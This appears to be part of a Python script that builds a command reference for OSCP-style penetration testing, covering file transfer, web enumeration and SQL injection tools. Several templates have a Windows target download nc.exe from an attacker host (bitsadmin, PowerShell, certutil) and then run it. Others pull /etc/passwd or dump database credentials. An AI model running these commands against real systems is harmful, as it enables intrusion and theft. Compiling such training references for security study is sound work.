            "REMOTE_PATH": {"description": "Remote path", "default": "/tmp/exploit.sh"}
        },
        flags=[
            {"flag": "-P", "description": "Specify SSH port (uppercase P)"},
            {"flag": "-r", "description": "Recursive (for directories)"},
        ],
        tags=["oscp", "scp", "file-transfer", "upload"],
        prerequisites=["SSH access to target"],
        next_steps=["chmod +x on uploaded file", "Execute"],
    ),
    create_command_template(
        cmd_id="scp-download",
        name="SCP - Download File",
        description="Download file from remote host via SCP",
        command="scp <USER>@<TARGET>:<REMOTE_FILE> <LOCAL_PATH>",
        category="file-transfer",
        subcategory="scp",
        variables={
            "USER": {"description": "SSH username", "default": "user"},
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"},
            "REMOTE_FILE": {"description": "Remote file path", "default": "/etc/passwd"},
            "LOCAL_PATH": {"description": "Local destination", "default": "./passwd"}
        },
        tags=["oscp", "scp", "file-transfer", "download"],
        prerequisites=["SSH access to target"],
        next_steps=["Analyze downloaded file"],
    ),
    create_command_template(
        cmd_id="ftp-connect",
        name="FTP - Connect",
        description="Connect to FTP server",
        command="ftp <TARGET>",
        category="file-transfer",
        subcategory="ftp",
        variables={
            "TARGET": {"description": "Target IP", "default": "192.168.1.1"}
        },
        tags=["oscp", "ftp", "file-transfer"],
        next_steps=["get <FILE> (download)", "put <FILE> (upload)", "binary (set binary mode)"],
    ),
    create_command_template(
        cmd_id="tftp-upload",
        name="TFTP - Upload File",
        description="Upload file via TFTP (common on Windows)",
        command="tftp -i <TARGET> PUT <LOCAL_FILE>",
        category="file-transfer",
        subcategory="tftp",
        variables={
            "TARGET": {"description": "TFTP server IP", "default": "10.10.14.1"},
            "LOCAL_FILE": {"description": "File to upload", "default": "data.txt"}
        },
        flags=[
            {"flag": "-i", "description": "Binary mode (Windows)"},
            {"flag": "PUT", "description": "Upload file"},
            {"flag": "GET", "description": "Download file"},
        ],
        tags=["oscp", "tftp", "file-transfer", "windows"],
        prerequisites=["TFTP server running on attacker: atftpd --daemon --port 69 /tftp"],
        next_steps=["Verify file transfer"],
    ),
    create_command_template(
        cmd_id="impacket-smbserver",
        name="Impacket SMB Server",
        description="Start temporary SMB server for file transfer",
        command="impacket-smbserver <SHARE_NAME> <DIRECTORY> -smb2support",
        category="file-transfer",
        subcategory="smb",
        variables={
            "SHARE_NAME": {"description": "Share name", "default": "share"},
            "DIRECTORY": {"description": "Directory to share", "default": "."}
        },
        flags=[
            {"flag": "-smb2support", "description": "Enable SMB2 support"},
            {"flag": "-username", "description": "Require authentication"},
            {"flag": "-password", "description": "Set password"},
        ],
        tags=["oscp", "impacket", "smb", "file-transfer"],
        next_steps=["copy \\\\<LHOST>\\<SHARE_NAME>\\<FILE> <DEST> (on Windows target)"],
    ),
    create_command_template(
        cmd_id="bitsadmin-download",
        name="Bitsadmin - Download File",
        description="Download file on Windows using bitsadmin",
        command="bitsadmin /transfer myDownload /download /priority high http://<LHOST>/<FILE> <DEST>",
        category="file-transfer",
        subcategory="windows",
        variables={
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"},
            "FILE": {"description": "File to download", "default": "nc.exe"},
            "DEST": {"description": "Destination path", "default": "C:\\Temp\\nc.exe"}
        },
        flags=[
            {"flag": "/transfer", "description": "Transfer job name"},
            {"flag": "/download", "description": "Download mode"},
            {"flag": "/priority", "description": "Priority level"},
        ],
        tags=["oscp", "bitsadmin", "windows", "file-transfer", "download"],
        prerequisites=["HTTP server running on attacker"],
        next_steps=["Execute downloaded file"],
    ),
    create_command_template(
        cmd_id="powershell-wget",
        name="PowerShell - Download File (wget)",
        description="Download file using PowerShell wget alias",
        command="powershell wget http://<LHOST>/<FILE> -OutFile <DEST>",
        category="file-transfer",
        subcategory="windows",
        variables={
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"},
            "FILE": {"description": "File to download", "default": "nc.exe"},
            "DEST": {"description": "Destination", "default": "C:\\Temp\\nc.exe"}
        },
        tags=["oscp", "powershell", "windows", "file-transfer", "download"],
        alternatives=["powershell-invoke-webrequest", "certutil -urlcache -f http://<LHOST>/<FILE> <DEST>"],
        next_steps=["Execute downloaded file"],
    ),
    create_command_template(
        cmd_id="powershell-invoke-webrequest",
        name="PowerShell - Invoke-WebRequest",
        description="Download file using PowerShell Invoke-WebRequest",
        command="powershell -c \"Invoke-WebRequest -Uri 'http://<LHOST>/<FILE>' -OutFile '<DEST>'\"",
        category="file-transfer",
        subcategory="windows",
        variables={
            "LHOST": {"description": "Attacker IP", "default": "10.10.14.1"},
            "FILE": {"description": "File to download", "default": "nc.exe"},
            "DEST": {"description": "Destination", "default": "C:\\Temp\\nc.exe"}
        },
        flags=[
            {"flag": "-Uri", "description": "URL to download"},
            {"flag": "-OutFile", "description": "Output file path"},
        ],
        tags=["oscp", "powershell", "windows", "file-transfer", "download"],
        prerequisites=["HTTP server on attacker"],
        next_steps=["Execute downloaded file"],
    ),
]


# ==============================================================================
# ADDITIONAL WEB COMMANDS (Complete the missing ones)
# ==============================================================================

WEB_COMMANDS_ADDITIONAL = [
    create_command_template(
        cmd_id="gobuster-dir-basic",
        name="Gobuster - Directory Enumeration",
        description="Fast directory/file brute-forcing tool",
        command="gobuster dir -u http://<TARGET> -w <WORDLIST>",
        category="web",
        subcategory="directory-enumeration",
        variables={
            "TARGET": {"description": "Target URL", "default": "192.168.1.1"},
            "WORDLIST": {"description": "Directory wordlist", "default": "/usr/share/wordlists/dirb/common.txt"}
        },
        flags=[
            {"flag": "dir", "description": "Directory/file enumeration mode"},
            {"flag": "-u", "description": "Target URL"},
            {"flag": "-w", "description": "Wordlist"},
            {"flag": "-x", "description": "File extensions to search (php,txt,html)"},
            {"flag": "-t", "description": "Number of threads (default 10)"},
        ],
        tags=["oscp", "gobuster", "web", "directory-enumeration"],
        alternatives=["ffuf-dir-fuzz", "wfuzz-dir"],
        next_steps=["Inspect discovered directories", "Check for sensitive files"],
    ),
    create_command_template(
        cmd_id="wfuzz-dir",
        name="Wfuzz - Directory Fuzzing",
        description="Web application fuzzer for directories",
        command="wfuzz -w <WORDLIST> --hc 404 http://<TARGET>/FUZZ",
        category="web",
        subcategory="fuzzing",
        variables={
            "WORDLIST": {"description": "Directory wordlist", "default": "/usr/share/wordlists/dirb/common.txt"},
            "TARGET": {"description": "Target IP/domain", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-w", "description": "Wordlist"},
            {"flag": "--hc", "description": "Hide HTTP status codes"},
            {"flag": "--hl", "description": "Hide by line count"},
            {"flag": "--hw", "description": "Hide by word count"},
        ],
        tags=["oscp", "wfuzz", "web", "fuzzing"],
        alternatives=["gobuster-dir-basic", "ffuf-dir-fuzz"],
        next_steps=["Enumerate discovered paths"],
    ),
    create_command_template(
        cmd_id="wfuzz-param",
        name="Wfuzz - Parameter Fuzzing",
        description="Fuzz for hidden parameters",
        command="wfuzz -w <WORDLIST> --hh 0 http://<TARGET>/?FUZZ=test",
        category="web",
        subcategory="fuzzing",
        variables={
            "WORDLIST": {"description": "Parameter wordlist", "default": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
            "TARGET": {"description": "Target URL", "default": "target.com/index.php"}
        },
        tags=["oscp", "wfuzz", "web", "parameters"],
        next_steps=["Test parameters for injection"],
    ),
    create_command_template(
        cmd_id="nikto-web-scan",
        name="Nikto - Web Vulnerability Scanner",
        description="Scan web server for vulnerabilities",
        command="nikto -h http://<TARGET>",
        category="web",
        subcategory="vulnerability-scanning",
        variables={
            "TARGET": {"description": "Target IP/domain", "default": "192.168.1.1"}
        },
        flags=[
            {"flag": "-h", "description": "Target host"},
            {"flag": "-p", "description": "Port (default 80)"},
            {"flag": "-ssl", "description": "Force SSL mode"},
            {"flag": "-o", "description": "Output file"},
        ],
        tags=["oscp", "nikto", "web", "vulnerability-scan"],
        next_steps=["Review findings", "Test identified vulnerabilities"],
    ),
    create_command_template(
        cmd_id="wpscan-enumerate",
        name="WPScan - WordPress Scanner",
        description="Enumerate WordPress installation",
        command="wpscan --url http://<TARGET> --enumerate u,p,t",
        category="web",
        subcategory="cms-enumeration",
        variables={
            "TARGET": {"description": "WordPress site URL", "default": "target.com"}
        },
        flags=[
            {"flag": "--url", "description": "Target WordPress site"},
            {"flag": "--enumerate", "description": "Enumerate users(u), plugins(p), themes(t)"},
            {"flag": "--api-token", "description": "WPVulnDB API token for vulnerability data"},
        ],
        tags=["oscp", "wpscan", "wordpress", "cms"],
        next_steps=["Brute force found users", "Check for vulnerable plugins"],
    ),
    create_command_template(
        cmd_id="joomscan-enumerate",
        name="Joomscan - Joomla Scanner",
        description="Enumerate Joomla installation",
        command="joomscan -u http://<TARGET>",
        category="web",
        subcategory="cms-enumeration",
        variables={
            "TARGET": {"description": "Joomla site URL", "default": "target.com"}
        },
        flags=[
            {"flag": "-u", "description": "Target URL"},
            {"flag": "-ec", "description": "Enumerate components"},
        ],
        tags=["oscp", "joomscan", "joomla", "cms"],
        next_steps=["Check for vulnerable components", "Test admin panel"],
    ),
    create_command_template(
        cmd_id="droopescan-enumerate",
        name="Droopescan - CMS Scanner",
        description="Scanner for Drupal, Joomla, Wordpress, Silverstripe",
        command="droopescan scan <CMS> -u http://<TARGET>",
        category="web",
        subcategory="cms-enumeration",
        variables={
            "CMS": {"description": "CMS type (drupal, joomla, wordpress)", "default": "drupal"},
            "TARGET": {"description": "Target URL", "default": "target.com"}
        },
        flags=[
            {"flag": "scan", "description": "CMS to scan"},
            {"flag": "-u", "description": "Target URL"},
            {"flag": "-t", "description": "Number of threads"},
        ],
        tags=["oscp", "droopescan", "cms", "drupal"],
        next_steps=["Check version for exploits", "Enumerate plugins/modules"],
    ),
    create_command_template(
        cmd_id="wget-recursive",
        name="Wget - Recursive Download",
        description="Recursively download website",
        command="wget -r -np -nH --cut-dirs=1 http://<TARGET>/",
        category="web",
        subcategory="web-scraping",
        variables={
            "TARGET": {"description": "Target URL", "default": "target.com"}
        },
        flags=[
            {"flag": "-r", "description": "Recursive download"},
            {"flag": "-np", "description": "No parent (don't ascend to parent directory)"},
            {"flag": "-nH", "description": "No host directories"},
            {"flag": "--cut-dirs", "description": "Ignore N directory levels"},
        ],
        tags=["oscp", "wget", "web", "download"],
        next_steps=["Analyze downloaded files", "Search for credentials/comments"],
    ),
    create_command_template(
        cmd_id="sqlmap-advanced",
        name="SQLMap - SQL Injection Testing",
        description="Automated SQL injection detection and exploitation",
        command="sqlmap -u '<URL>' -p <PARAM> --batch",
        category="web",
        subcategory="sql-injection",
        variables={
            "URL": {"description": "Target URL with parameter", "default": "http://target.com/index.php?id=1"},
            "PARAM": {"description": "Parameter to test", "default": "id"}
        },
        flags=[
            {"flag": "-u", "description": "Target URL"},
            {"flag": "-p", "description": "Testable parameter"},
            {"flag": "--batch", "description": "Non-interactive mode"},
            {"flag": "--dbs", "description": "Enumerate databases"},
            {"flag": "--dump", "description": "Dump table data"},
        ],
        tags=["oscp", "sqlmap", "sql-injection", "web"],
        next_steps=["Enumerate databases", "Dump credentials", "OS command execution"],
    ),
]


# ==============================================================================
# MAIN FUNCTION
# ==============================================================================

def generate_all_commands():
    """Generate all command definition files."""
    output_dir = Path(__file__).parent.parent.parent / "reference" / "data" / "commands" / "generated"
    output_dir.mkdir(exist_ok=True, parents=True)

    # Combine all WEB_COMMANDS
    all_web_commands = WEB_COMMANDS + WEB_COMMANDS_ADDITIONAL

    # Generate files by category
    categories = {
        "recon-additions.json": RECON_COMMANDS,
        "web-additions.json": all_web_commands,
        "exploitation-additions.json": EXPLOIT_COMMANDS,
        "post-exploitation-additions.json": POST_EXPLOIT_COMMANDS,
        "privilege-escalation-additions.json": PRIVESC_COMMANDS,
        "password-attacks-additions.json": PASSWORD_COMMANDS,
        "tunneling-additions.json": TUNNEL_COMMANDS,
        "active-directory-additions.json": AD_COMMANDS,
        "file-transfer-additions.json": TRANSFER_COMMANDS,
    }

    total_commands = 0
    for filename, commands in categories.items():
        output_file = output_dir / filename
        with open(output_file, 'w') as f:
            json.dump({"commands": commands}, f, indent=2)
        print(f"✓ Generated {len(commands):3d} commands → {filename}")
        total_commands += len(commands)

    # Summary
    print(f"\n{'='*60}")
    print(f"✓ Total commands generated: {total_commands}")
    print(f"✓ Output directory: {output_dir}")
    print(f"\n{'='*60}")
    print("\nBreakdown by category:")
    print(f"  Reconnaissance & Enumeration:  {len(RECON_COMMANDS):3d} commands")
    print(f"  Web Application Testing:       {len(all_web_commands):3d} commands")
    print(f"  Exploitation Tools:            {len(EXPLOIT_COMMANDS):3d} commands")
    print(f"  Post-Exploitation:             {len(POST_EXPLOIT_COMMANDS):3d} commands")
    print(f"  Privilege Escalation:          {len(PRIVESC_COMMANDS):3d} commands")
    print(f"  Password Attacks:              {len(PASSWORD_COMMANDS):3d} commands")
    print(f"  Tunneling & Pivoting:          {len(TUNNEL_COMMANDS):3d} commands")
    print(f"  Active Directory:              {len(AD_COMMANDS):3d} commands")
    print(f"  File Transfer:                 {len(TRANSFER_COMMANDS):3d} commands")
    print(f"\n{'='*60}")
    print("\nNext steps:")
    print("1. Review generated JSON files in db/data/commands/generated/")
    print("2. Verify command syntax against official documentation")
    print("3. Test variable substitution with crack reference --fill")
    print("4. Run migration script to import to database (if needed)")


if __name__ == "__main__":
    generate_all_commands()
